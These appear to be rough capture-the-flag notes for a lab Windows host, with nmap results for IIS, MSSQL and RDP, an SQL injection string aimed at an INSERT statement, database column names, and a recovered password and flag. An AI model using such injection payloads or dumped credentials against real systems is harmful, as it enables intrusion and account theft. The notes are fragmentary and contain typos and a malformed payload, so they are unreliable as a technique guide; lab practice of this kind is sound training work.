---
tags:
---


We will start with nmap:
```
PORT     STATE SERVICE       REASON          VERSION
443/tcp  open  https         syn-ack ttl 127 Microsoft-IIS/10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Supported Methods: GET
| ssl-cert: Subject: commonName=WEB
| Subject Alternative Name: DNS:WEB, DNS:WEB.TEIGNTON.HTB
| Issuer: commonName=WEB
| Public Key type: rsa
|_http-title: Home page - Home
1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2070.00; GDR1
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=WEB.TEIGNTON.HTB
| Issuer: commonName=WEB.TEIGNTON.HTB
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-10T06:30:07
| Not valid after:  2026-04-11T06:30:07
| MD5:   31ee:cf2e:7365:747d:ee4b:6f5a:0edd:0999
| SHA-1: a4e1:ca8c:fd42:3ce6:d62e:d745:b863:e5e3:8e30:ad68
| rdp-ntlm-info:
|   Target_Name: TEIGNTON
|   NetBIOS_Domain_Name: TEIGNTON
|   NetBIOS_Computer_Name: WEB
|   DNS_Domain_Name: TEIGNTON.HTB
|   DNS_Computer_Name: WEB.TEIGNTON.HTB
|   DNS_Tree_Name: TEIGNTON.HTB
|   Product_Version: 10.0.17763
|_  System_Time: 2026-01-10T15:26:45+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

```
INSERT INTO table_name (column1, column2, column3, ...)
VALUES ('name', 'price', 'creationYear', 'certified'); 

name = 'asdf', if(true) return 1 else 'asdf', 2020, 1);--
```


```
Databae: webapp

id, first_name, last_name, password, username
```

```

Abbie:AMkru$3_f'/Q^7f?
testing:CONTEXT{d0_it_st0p_it_br34k_it_f1x_it}
```